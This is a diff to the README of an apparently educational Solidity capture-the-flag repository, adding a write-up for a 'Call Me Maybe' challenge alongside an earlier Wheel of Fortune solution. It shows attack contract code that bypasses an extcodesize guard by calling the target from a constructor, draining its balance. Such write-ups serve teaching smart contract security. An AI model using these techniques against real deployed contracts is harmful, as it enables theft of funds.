@@ -14,11 +14,12 @@ forge compile: Compile smart contracts
 forge test: Run tests for challenges solution
 forge test -vvv: Run tests for challenges with tracers enabled (recommended for all challenges, to output the logs of the states before and after the exploit)
 ```
-## Challenges
+## Challenges 
 
-1. [Azino 777](#01---azino777)
-2. [Private Ryan](#02---private-ryan)
-3. [Weel Of Fortune](#03---wheel-of-fortune)   
+[Azino 777](#01---azino777)
+[Private Ryan](#02---private-ryan)
+[Weel Of Fortune](#03---wheel-of-fortune)   
+[Call me Maybe](#04---call-me-maybe)
    
 ## 01 - Azino777
 
@@ -118,5 +119,40 @@ function attack() external payable {
     target.spin{value: 0.01 ether}(bet);
 }
 ```
-Another approach to solve the challenge is by waiting for **256 blocks** after our bet transaction, that is because according to [Solidity documentation](https://docs.soliditylang.org/en/v0.8.20/units-and-global-variables.html#block-and-transaction-properties): `blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero`. However, this approach is harder to follow, and it requires designing a bot to keep watching the network, we will stick with the first approach (the smartest :V).
+Another approach to solve the challenge is by waiting for **256 blocks** after our bet transaction, that is because according to [Solidity documentation](https://docs.soliditylang.org/en/v0.8.20/units-and-global-variables.html#block-and-transaction-properties): `blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero`. However, this approach is harder to follow, and it requires designing a bot to keep watching the network, we will stick with the first approach (the smartest :V). <br />
 [Attack contract](./src/WheelOfFortune.sol) | [Tests](./test/WheelOfFortune.t.sol)
+
+## 04 - Call Me Maybe
+
+The solution of this challenge won't take more than 2 lines if we know a tricky thing (as always, smart contract vulnerabilities are all tricky).
+By inspecing the contract's code, it seems that no one can call it:
+```solidity
+    modifier callMeMaybe() {
+        uint32 size;
+        address _addr = msg.sender;
+        assembly {
+            size := extcodesize(_addr)
+        }
+        if (size > 0) {
+            revert();
+        }
+        _;
+    }
+
+    function HereIsMyNumber() external callMeMaybe {
+        if (tx.origin == msg.sender) {
+            revert();
+        } else {
+            payable(msg.sender).transfer(address(this).balance);
+        }
+    }
+```
+If we invoke the `HereIsmyNumber` function from an EOA, the check `tx.origin == msg.sender` will pass, so the transaction will revert while if we invoke it from a smart contract, the modifier `callmeMabye` will fail as well, so our transaction will revert in all cases.<br>
+It seems that no smart contract can call this contract due to the EVM check using `extcodesize`. `extcodesize` returns the bytecode size of the `_addr` account. However, there is a bypass for that. At the moment when a newly deployed contract calls another contract in its constructor, the storage root is not yet initialized, it acts as a wallet only. Hence, it does not have associated code and `extcodesize` would yield zero.
+```solidity
+constructor(address payable _target) {
+    CallMeMaybe(_target).HereIsMyNumber();
+}
+```
+I told you we can solve it in two lines ;)
+[Attack Contract](./src/CallMeMaybe.sol) | [Tests](./test/CallMeMaybe.t.sol)
